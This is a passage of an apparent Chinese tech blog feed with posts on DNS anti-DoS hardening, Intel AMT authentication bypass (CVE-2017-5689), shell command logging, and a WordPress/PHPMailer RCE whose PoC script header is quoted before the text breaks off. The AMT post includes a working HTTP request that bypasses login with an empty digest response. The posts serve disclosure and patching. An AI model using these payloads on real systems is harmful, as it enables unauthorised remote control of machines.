id="12-增强DNS服务器的防范Dos-DDoS功能"><a href="#12-增强DNS服务器的防范Dos-DDoS功能" class="headerlink" title="12.增强DNS服务器的防范Dos/DDoS功能"></a>12.增强DNS服务器的防范Dos/DDoS功能</h3><p>1.使用SYNcookie</p><p>SYNCookie是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYNFlood攻击的一种手段。它的原理是，在TCP服务器收到TCPSYN包并返回TCPSYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。在收到TCPACK包时，TCP服务器在根据那个cookie值检查这个TCPACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。在linux下以root权限执行：</p><p>2.增大backlog<br>通过增加backlog的数值，可以一定程度减缓大量SYN请求导致TCP连接阻塞的状况，一般这个数值系统默认是1024，可以增加到1280至2048：</p><p>这样在强度不是很高的攻击下，系统响应能力提高了一点。<br>3.缩短retries次数<br>Linux系统默认的tcp_synack_retries是5次，将这个数值减少可以提高系统响应能力，为2次：</p><p>修改后，SYN_RECV的数量有了少量减少，系统响应也快了一些。<br>4.限制SYN频率<br>目前比较有效的是对SYN的频率和次数进行限制，这样最大限度的控制了单个IP地址发动攻击的能力。例如将SYN请求的次数限制在30次每分钟，系统默认是5次/秒可以将burst从默认的5个降低到2个。</p><p>进行此操作后正常的用户无任何感觉上的差异，而并发的SYN请求量下降了不少，服务响应基本正常了。<br>5.防范SYNAttack攻击<br>SYNAttack”是一种拒绝服务（DoS）的攻击方式，会消耗掉系统中的所有资源，迫使服务器重新启动。使用下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo1&gt;/proc/sys/net/ipv4/tcp_syncookies</span><br></pre></td></tr></table></figure></p><p>把这个命令加入”/etc/rc.d/rc.local”文件中，等下次系统重新启动的时候就可以自动生效。</p><h3 id="13-使用分布式DNS负载均衡"><a href="#13-使用分布式DNS负载均衡" class="headerlink" title="13.使用分布式DNS负载均衡"></a>13.使用分布式DNS负载均衡</h3><p>在众多的负载均衡架构中，基于DNS解析的负载均衡本身就拥有对DDOS（SYNFlood）的免疫力，基于DNS解析的负载均衡能将用户的请求分配到不同IP的服务器主机上，攻击者攻击的永远只是其中一台服务器，一来这样增加了攻击者的成本，二来过多的DNS请求可以帮助我们追查攻击者的真正踪迹（DNS请求不同于SYN攻击，是需要返回数据的，所以很难进行IP伪装）。但是基于DNS解析的负载均衡成本很高。很多中小公司没有部署这个技术。</p><h3 id="14-防范对于DNS服务器网络"><a href="#14-防范对于DNS服务器网络" class="headerlink" title="14.防范对于DNS服务器网络"></a>14.防范对于DNS服务器网络</h3><p>嗅探器技术被广泛应用于网络维护和管理方面，它工作的时候就像一部被动声纳，默默的接收看来自网络的各种信息，通过对这些数据的分析，网络管理员可以深入了解网络当前的运行状况，以便找出网络中的漏洞。在网络安全日益被注意的今天.我们不但要正确使用嗅探器。还要合理防范嗅探器的危害.嗅探器能够造成很大的安全危害，主要是因为它们不容易被发现。对于一个安全性能要求很严格的企业，同时使用安全的拓扑结构、会话加密、使用静态的ARP地址是有必要的。</p><h3 id="15-及时更新系统补丁"><a href="#15-及时更新系统补丁" class="headerlink" title="15.及时更新系统补丁"></a>15.及时更新系统补丁</h3><p>你应该经常到你所安装的系统发行商的主页上去找最新的补丁。目前操作系统维护主要分两种模式：对于私有操作系统（Windows/Solaris等）由于个人用户不能直接接触其源代码，其代码由公司内部开发人员维护，其安全性由同样的团队保证，内核的修正与其他应用程序一样，以patch/SP包的方式发布。对于Linux这样的开放式系统，是一种开放的结构。应该说，开放的模式是双刃剑。从机制上讲，全世界的开发人员都能获得源代码，从而找出其中的纰漏，似乎安全性应该更好;但是同时，如果网络管理人员不能及时更新内核，也会留下安全隐患。如果你是一个Linux网管员，你经常需要上相应的网站看，是否有补丁，是否有了bugfix，是否需要升级。Linux服务器运行的软件主要包括：Bind，Apache等软件大都是开源软件，而且都在不停升级，稳定版和测试版交替出现。在<a href="http://www.apache.org上，最新的changeLog中都写着：bugfix,securitybugfix的字样。所以Linux网管员要经常的关注相关网站及时升级或添加补丁。" target="_blank" rel="noopener">www.apache.org上，最新的changeLog中都写着：bugfix,securitybugfix的字样。所以Linux网管员要经常的关注相关网站及时升级或添加补丁。</a></p><p>##总结：<br>DNS是网络服务的基础建设，要长期不断地保持其正常运作，每一个DNS服务器都应该定期检测。域名系统的配置和管理是一项比较复杂和繁琐的系统管理任务，它对整个网络的运行影响极大。为了保证DNS服务器的安全运行，不仅要使用可靠的服务器软件版本，而且要对DNS服务器进行安全配置，同时还要跟踪服务器软件和操作系统的各种漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章简介&quot;&gt;&lt;a href=&quot;#文章简介&quot; class=&quot;headerlink&quot; title=&quot;文章简介&quot;&gt;&lt;/a&gt;文章简介&lt;/h2&gt;&lt;p&gt;本文介绍了当前互联网DNS服务器所存在的隐患（几种典型的DNS攻击方式）及安全加固&lt;/p&gt;
&lt;h2 id=&quot;DNS服务所面临
      
    
    </summary>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E5%AE%89%E5%85%A8/"/>
    
      <category term="bind" scheme="http://blog.unixmen.cn/categories/%E5%AE%89%E5%85%A8/bind/"/>
    
      <category term="DNS" scheme="http://blog.unixmen.cn/categories/%E5%AE%89%E5%85%A8/bind/DNS/"/>
    
    
      <category term="安全" scheme="http://blog.unixmen.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="bind" scheme="http://blog.unixmen.cn/tags/bind/"/>
    
      <category term="DNS攻击" scheme="http://blog.unixmen.cn/tags/DNS%E6%94%BB%E5%87%BB/"/>
    
      <category term="DNS安全加固" scheme="http://blog.unixmen.cn/tags/DNS%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析</title>
    <link href="http://blog.unixmen.cn/2017/05/09/%E8%8B%B1%E7%89%B9%E5%B0%94AMT%E5%8A%9F%E8%83%BD%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-5689%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>http://blog.unixmen.cn/2017/05/09/英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析/</id>
    <published>2017-05-09T09:20:23.000Z</published>
    <updated>2017-05-09T09:21:25.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h2><p>本文讲述英特尔AMT功能远程提权高危漏洞介绍，说明及漏洞验证及修复方法。</p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>这款漏洞编号为CVE-2017-5689，能够影响到英特尔远程管理技术，包括Active Management Technology (AMT), Intel Standard Manageability(ISM)和Intel Small Business Technology (SBT)软件，版本号由6开始到11.6。如果你在电脑上看到过这些标志，那么你很有可能中招了。</p><p>漏洞最先由Embedi 研究团队的MaksimMalyutin在二月中旬发现，发现后他立即提交给了英特尔安全团队。</p><p>现在大部分系统管理员已经通过补丁更新了系统，Embedi决定披露<a href="https://embedi.com/news/what-you-need-know-about-intel-amt-vulnerability" target="_blank" rel="noopener">更多细节</a>。</p><p>黑客能够通过发送空的验证字符串来劫持使用英特尔芯片的电脑，在了解其中的原理之前我们得先回答下面几个问题：</p><blockquote><p>什么是Intel AMT？<br>Intel AMT漏洞出现在哪里？<br>黑客怎样利用这个漏洞？</p></blockquote><h2 id="什么是Intel-AMT？"><a href="#什么是Intel-AMT？" class="headerlink" title="什么是Intel AMT？"></a>什么是Intel AMT？</h2><p>英特尔通过其 vPro 商务处理器平台提供了 Intel Active Management Technology(AMT)技术，这项技术能让IT管理人员远程管理和修复PC、工作站和服务器。</p><p>这项预设的功能使用基于Web的控制页面，通过远程端口16992和16993让管理员远程管理系统。</p><p>Intel AMT Web界面甚至可以在系统关机时运作，因为它集成在芯片中，所以可以独立于操作系统运作，只要机器连接了电源和网线。</p><h2 id="Intel-AMT漏洞出现在哪里？"><a href="#Intel-AMT漏洞出现在哪里？" class="headerlink" title="Intel AMT漏洞出现在哪里？"></a>Intel AMT漏洞出现在哪里？</h2><p>为了防止功能被未授权的用户滥用，AMT服务会使用HTTP摘要认证和Kerberos验证机制。</p><p>权限提升漏洞就出现在Intel AMT Web界面通过HTTP摘要认证协议认证用户的环节，这是个基于挑战/应答(Challenge/Response)方式的身份认证系统。</p><p>在解释漏洞之前我们先了解一下摘要认证的原理，摘要认证包含以下这些步骤：</p><blockquote><p>用户先发起一个没有认证证书的登陆请求，作为响应，服务器回复一个随机数（称作”nonce“）、HTTP方法以及请求的URI。<br>接下来用户就会被提示输入用户名和密码。<br>输入后，客户端就会发送一个加密的字符串(user_response)，字符串是使用一个单向的加密函数生成的一个消息摘要（message digest），该摘要由用户名、密码、给定的nonce值、HTTP方法，以及所请求的URI生成。<br>而服务器端也会通过数据库中的用户名密码计算一个类似的加密字符串(computed_response)。<br>服务器使用strncmp()函数对两个字符串进行比较，如果二者相符就会让用户登陆Intel AMT Web界面。</p></blockquote><p>而Intel AMT漏洞正是出现在strncmp()函数中。</p><p>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strncmp (string_1, string_2 , length)</span><br></pre></td></tr></table></figure></p><p>其中length参数定义了多少个字符会被比较</p><p>Strncmp()是一个二进制安全字符串比较函数，所谓二进制安全就是指在一个二进制文件上所执行的不更改文件内容的功能或者操作，其本质上将操作输入作为原始的、无任何特殊格式意义的数据流。函数的返回值包括负整数，0和正整数，取决于string_1是否比string_2大，如果二者相等，则返回0。</p><p>存在问题的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(strncmp(computed_response, user_response, response_length))</span><br><span class="line">exit(0x99);</span><br></pre></td></tr></table></figure></p><p>很明显，要认证成功，变量user_response的值必须等于computed_response，因此无论长度如何，strncmp()函数的返回值必须为0。</p><p>但是写这段代码的程序员错误地吧user_response的长度放到了strncmp()函数中，而非computed_response。</p><h2 id="黑客如何利用？"><a href="#黑客如何利用？" class="headerlink" title="黑客如何利用？"></a>黑客如何利用？</h2><p>要想利用漏洞，未经授权的用户只需要发送空的user_response值。</p><p>由于strncmp()错误地用user_response变量来认证用户，因此，发送null值就会让比较很熟认为user_response与computed_response相等，从而通过验证。</p><p>攻击示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">GET /index.htm HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:16992</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101</span><br><span class="line">Firefox/45.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">WWW-Authenticate: Digest</span><br><span class="line">realm=»Digest:048A0000000000000000000000000000»,</span><br><span class="line">nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n»,stale=»false»,qop=»auth»</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Server: AMT</span><br><span class="line">Content-Length: 678</span><br><span class="line">Connection: close</span><br><span class="line">GET /index.htm HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:16992</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101</span><br><span class="line">Firefox/45.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Digest username=»admin»,</span><br><span class="line">realm=»Digest:048A0000000000000000000000000000»,</span><br><span class="line">nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n», uri=»/index.htm», response=»»,</span><br><span class="line">qop=auth, nc=00000001, cnonce=»60513ab58858482c»</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 4 May 2017 16:09:17 GMT</span><br><span class="line">Server: AMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Cache-Control: no cache</span><br><span class="line">Expires: Thu, 26 Oct 1995 00:00:00 GMT</span><br><span class="line">04E6</span><br></pre></td></tr></table></figure><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者还可以使用Keyboard Video Mouse (KVM)功能，这个功能内置在Intel AMT Web控制平台中，KVM能够让系统管理员远程控制系统，能够执行的操作包括：</p><blockquote><p>“[攻击者]可以远程加载执行任意程序，读写文件（使用常规的文件管理器）” ，研究人员在<a href="https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf" target="_blank" rel="noopener">论文</a>中写道，“使用IDE-R (IDERedirection)，黑客还可以远程更改启动设备，比如吧其他虚拟镜像作为启动设备。”<br>“使用SOL (Serial over LAN), [攻击者]能够远程开关机/重启/重置系统，还可以对BIOS选项进行编辑。”<br>也就是说，黑客可以做任何事情，可以登陆机器、执行恶意活动，包括修改系统和安装那些无法检测的恶意软件。</p></blockquote><h2 id="升级固件修复系统"><a href="#升级固件修复系统" class="headerlink" title="升级固件修复系统"></a>升级固件修复系统</h2><p>漏洞影响的英特尔管理固件版本包括6.x, 7.x, 8.x 9.x, 10.x, 11.0,11.5和11.6，不过在6以前和11.6以后的版本则不受影响。</p><p>英特尔已经将漏洞评级为高危，并且发布了<a href="https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&amp;languageid=en-fr" target="_blank" rel="noopener">新的固件版本</a>。于此同时，英特尔还发布了一些指导文件，<a href="https://communities.intel.com/docs/DOC-5693" target="_blank" rel="noopener">一份</a>用于检测工作站是否运行了AMT, ISM或SBT，<a href="https://downloadcenter.intel.com/download/26755" target="_blank" rel="noopener">一份</a>用于检测系统是否存在漏洞，还有针对不能立即升级的企业的<a href="https://downloadcenter.intel.com/download/26754" target="_blank" rel="noopener">修复指导</a>。</p><p>研究员Bart Blaze在GitHub上也发布了一款简单的<a href="https://github.com/bartblaze/Disable-Intel-AMT" target="_blank" rel="noopener">修复工具</a>，基于英特尔的指导文件制作。</p><p>Cerberus Security在GitHub上也发布了一款<a href="https://github.com/CerberusSecurity/CVE-2017-5689" target="_blank" rel="noopener">检测AMT漏洞脚本</a>,基于python语言。</p><p>受影响的用户只需要下载运行其中的DisableAMT.exe，这个文件会关闭Windows操作系统（x86和x64系统）中的AMT功能。<br><img src="https://camo.githubusercontent.com/07696e4d295aacfaf19fa651c467cc783cbb79d7/687474703a2f2f692e696d6775722e636f6d2f6534444d5845562e706e67" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章简述&quot;&gt;&lt;a href=&quot;#文章简述&quot; class=&quot;headerlink&quot; title=&quot;文章简述&quot;&gt;&lt;/a&gt;文章简述&lt;/h2&gt;&lt;p&gt;本文讲述英特尔AMT功能远程提权高危漏洞介绍，说明及漏洞验证及修复方法。&lt;/p&gt;
&lt;h2 id=&quot;漏洞说明&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Intel AMT 漏洞" scheme="http://blog.unixmen.cn/tags/Intel-AMT-%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Shell实时命令历史记录</title>
    <link href="http://blog.unixmen.cn/2017/05/09/Shell%E5%AE%9E%E6%97%B6%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/"/>
    <id>http://blog.unixmen.cn/2017/05/09/Shell实时命令历史记录/</id>
    <published>2017-05-09T08:14:31.000Z</published>
    <updated>2017-05-09T08:17:46.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h2><p>本文简要介绍了实时记录Shell终端历史命令的一种方法，该方法可将linux shell执行命令历史记录到日志文件中，可配合日志服务器，可把日志传送过去，安全性高。<br>日志记录内容包括：命令执行时间戳，主机名，登陆用户名，PPID，客户端IP地址，执行命令工作目录及执行命令等信息。</p><h2 id="安装rsyslog服务"><a href="#安装rsyslog服务" class="headerlink" title="安装rsyslog服务"></a>安装rsyslog服务</h2><ul><li><p>安装rsyslog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install rsyslog</span><br></pre></td></tr></table></figure></li><li><p>启动rsyslog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable rsyslog.service</span><br><span class="line">systemctl start  rsyslog.service</span><br></pre></td></tr></table></figure></li></ul><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><ul><li><p>修改/etc/bashrc<br>将以下内容加入到/etc/bashrc文件下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PROMPT_COMMAND=&apos;history -a;command=$(history 1);logger -p local1.notice -t bash -i &quot;user=$USER,ppid=$PPID,from=$SSH_CLIENT,pwd=$PWD,command:$command &quot;&apos;</span><br></pre></td></tr></table></figure></li><li><p>修改/etc/rsyslog.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;local1.notice /var/log/.command.log&quot; &gt;&gt;/etc/rsyslog.conf</span><br></pre></td></tr></table></figure></li><li><p>重启rsyslog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart  rsyslog.service</span><br></pre></td></tr></table></figure></li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>如果正常的情况下，在文件 /var/log/.command.log下会记录类似如下格式的日志文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">May  9 15:59:10 localhost bash[8145]: user=root,ppid=18370,from=10.100.0.2 53033 22,pwd=/root,command: 1083  ls -ltr</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章简述&quot;&gt;&lt;a href=&quot;#文章简述&quot; class=&quot;headerlink&quot; title=&quot;文章简述&quot;&gt;&lt;/a&gt;文章简述&lt;/h2&gt;&lt;p&gt;本文简要介绍了实时记录Shell终端历史命令的一种方法，该方法可将linux shell执行命令历史记录到日志文件中，可配合
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="运维" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="命令行" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E8%BF%90%E7%BB%B4/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
    
      <category term="命令行" scheme="http://blog.unixmen.cn/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
      <category term="历史" scheme="http://blog.unixmen.cn/tags/%E5%8E%86%E5%8F%B2/"/>
    
      <category term="history" scheme="http://blog.unixmen.cn/tags/history/"/>
    
      <category term="运维" scheme="http://blog.unixmen.cn/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）</title>
    <link href="http://blog.unixmen.cn/2017/05/05/PHPMailer%E6%9B%9D%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-10033%EF%BC%89/"/>
    <id>http://blog.unixmen.cn/2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/</id>
    <published>2017-05-05T01:33:21.000Z</published>
    <updated>2017-05-09T08:26:20.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【2017-5-4更新】"><a href="#【2017-5-4更新】" class="headerlink" title="【2017.5.4更新】"></a>【2017.5.4更新】</h2><p>昨天曝出了两个比较热门的漏洞，一个是CVE-2016-10033，另一个则为CVE-2017-8295。从描述来看，前者是WordPress Core 4.6一个未经授权的RCE漏洞。不过实际上，这就是去年12月份FreeBuf已经报道的漏洞，因此我们在原文基础上进行更新。</p><p>这次漏洞公告就是PHPMailer漏洞利用细节在WordPress核心中的实现。未经授权的攻击者利用漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。无需插件或者非标准设置，就能利用该漏洞。实际上Wordfence当时就曾经提到过该漏洞影响到了WP Core。</p><p>最新的这则公告提到了PHP mail()函数的新利用向量，可在MTA – Exim4之上利用该漏洞，Exim在如Debian或Ubuntu等系统中都是默认安装的。这样一来也就增加了此类攻击的范围和漏洞的严重性。具体为利用host字段注入了恶意数据，进入到了mail函数，再利用sendmail (实际上是软连接到的exim4)命令的-be 参数来执行命令。</p><p>之所以到现在才公布这部分细节，是期望给予WordPress和其它收到影响的软件提供商更多时间来升级受影响的Mail库。除此之外，也是针对CVE-2017-8295漏洞留出更多的修复时间。</p><p>漏洞利用详情参见：<a href="https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html" target="_blank" rel="noopener">https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html</a></p><p>影响范围：</p><p>本次公告中提到的RCE PoC基于WordPress 4.6实现，不过其它版本的WordPress也可能受到影响。</p><p>视频演示PoC：<a href="https://www.youtube.com/watch?v=ZFt_S5pQPX0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ZFt_S5pQPX0</a></p><p>更新：PoC代码已经公布，请站长们尽快升级！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#</span><br><span class="line"># __ __ __ __ __</span><br><span class="line"># / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________</span><br><span class="line"># / / / _ \/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</span><br><span class="line"># / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ )</span><br><span class="line"># /_____/\___/\__, /\__,_/_/ /_/ /_/\__,_/\___/_/|_|\___/_/ /____/</span><br><span class="line"># /____/</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</span><br><span class="line"># CVE-2016-10033</span><br><span class="line">#</span><br><span class="line"># wordpress-rce-exploit.sh (ver. 1.0)</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Discovered and coded by</span><br><span class="line">#</span><br><span class="line"># Dawid Golunski (@dawid_golunski)</span><br><span class="line"># https://legalhackers.com</span><br><span class="line">#</span><br><span class="line"># ExploitBox project:</span><br><span class="line"># https://ExploitBox.io</span><br><span class="line">#</span><br><span class="line"># Full advisory URL:</span><br><span class="line"># https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span><br><span class="line">#</span><br><span class="line"># Exploit src URL:</span><br><span class="line"># https://exploitbox.io/exploit/wordpress-rce-exploit.sh</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Tested on WordPress 4.6:</span><br><span class="line"># https://github.com/WordPress/WordPress/archive/4.6.zip</span><br><span class="line">#</span><br><span class="line"># Usage:</span><br><span class="line"># ./wordpress-rce-exploit.sh target-wordpress-url</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Disclaimer:</span><br><span class="line"># For testing purposes only</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># -----------------------------------------------------------------</span><br><span class="line">#</span><br><span class="line"># Interested in 